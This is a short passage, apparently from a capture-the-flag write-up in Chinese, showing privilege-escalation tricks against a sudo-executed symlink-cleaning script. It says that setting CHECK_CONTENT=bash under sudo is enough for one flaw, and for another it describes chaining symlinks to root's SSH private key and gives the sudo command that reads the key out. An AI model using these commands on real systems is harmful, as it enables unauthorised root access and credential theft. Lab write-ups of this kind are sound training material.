...
第二種漏洞只要sudo CHECK_CONTENT=bash ...就可以了，可以嘗試一下。

以下展示第三種漏洞

建立兩個符號連結檔案，第一個連結向root的SSH金鑰，第二個指向第一個
```bash
...
以sudo權限呼叫腳本，獲得SSH金鑰
```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
```
